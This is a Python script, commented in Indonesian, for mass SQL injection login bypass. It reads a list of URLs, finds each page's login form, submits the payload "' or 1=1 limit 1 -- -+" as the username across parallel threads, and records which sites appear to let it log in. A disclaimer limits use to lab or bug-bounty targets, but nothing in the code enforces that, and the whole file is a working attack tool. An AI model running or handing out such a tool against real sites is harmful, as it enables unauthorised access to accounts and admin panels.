#!/usr/bin/env python3
"""
mass_sqli_form_parser_public.py
SAFE: Only for lab dummy or bug bounty sites you have permission.
Automatically finds login forms, handles hidden fields, submits SQL payload.
"""

import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin
import time
import csv

DEFAULT_PAYLOAD = "' or 1=1 limit 1 -- -+"
HEADERS = {"User-Agent": "LabSQLiTester/1.0"}
REQUEST_DELAY = 0.1

def test_login_form(url, payload=DEFAULT_PAYLOAD):
    result = {"url": url, "success": False, "status_code": None, "note": ""}
    try:
        resp = requests.get(url, headers=HEADERS, timeout=10)
        soup = BeautifulSoup(resp.text, "html.parser")
        form = soup.find("form")
        if not form:
            result["note"] = "Tidak ada form login ditemukan"
            return result

        action = form.get("action") or url
        post_url = urljoin(url, action)

        # ambil semua input
        inputs = form.find_all("input")
        data = {}

        # field pertama = username, kedua = password, sisanya hidden/default
        text_fields = [i for i in inputs if i.get("type") in ("text","email","password")]
        for i, inp in enumerate(text_fields):
            name = inp.get("name")
            if not name:
                continue
            if i == 0:
                data[name] = payload
            elif i == 1:
                data[name] = ""
            else:
                data[name] = inp.get("value") or ""

        post_resp = requests.post(post_url, data=data, headers=HEADERS, timeout=10)
        result["status_code"] = post_resp.status_code

        lowered = post_resp.text.lower()
        indicators = []
        for token in ("logout", "dashboard", "welcome", "admin", "profile", "you are logged in"):
            if token in lowered:
                indicators.append(token)
        if post_resp.status_code in (302,303) or any(tok in post_resp.headers.get("location","").lower() for tok in ("admin","dashboard")):
            result["success"] = True
            result["note"] = "Redirect setelah POST -> kemungkinan login berhasil"
        elif indicators:
            result["success"] = True
            result["note"] = f"Indicator tokens ditemukan: {indicators}"
        else:
            result["note"] = "Tidak ada indikasi sukses yang jelas"

    except Exception as e:
        result["note"] = f"Exception: {e}"

    time.sleep(REQUEST_DELAY)
    return result

def mass_test(urls, threads=10):
    results = []
    with ThreadPoolExecutor(max_workers=threads) as ex:
        futures = {ex.submit(test_login_form, u): u for u in urls}
        for fut in as_completed(futures):
            results.append(fut.result())
    return results

def main():
    list_file = input("Masukkan nama file list URL (contoh: list.txt): ").strip()
    txt_file = input("Masukkan nama file TXT hasil output (contoh: result.txt): ").strip()
    csv_file = input("Masukkan nama file CSV hasil output (contoh: result.csv): ").strip()
    try:
        with open(list_file, "r") as f:
            urls = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"Gagal membaca file {list_file}: {e}")
        return

    threads = input("Jumlah thread paralel (default 10): ").strip()
    threads = int(threads) if threads.isdigit() else 10

    print("\nWARNING: Use only on lab dummy / bug bounty sites you have permission!\n")

    results = mass_test(urls, threads=threads)

    # Simpan ke TXT
    with open(txt_file, "w") as f:
        for r in results:
            status = "[POSSIBLE BYPASS]" if r.get("success") else "[NO BYPASS]"
            line = f"{status} {r['url']} (HTTP {r.get('status_code')}) -> {r.get('note')}\n"
            f.write(line)
            print(line.strip())

    # Simpan ke CSV
    with open(csv_file, "w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow(["URL","Status","HTTP Code","Note"])
        for r in results:
            status = "POSSIBLE BYPASS" if r.get("success") else "NO BYPASS"
            writer.writerow([r['url'], status, r.get("status_code"), r.get("note")])

    print(f"\nHasil TXT tersimpan di {txt_file}")
    print(f"Hasil CSV tersimpan di {csv_file}")

if __name__ == "__main__":
    main()
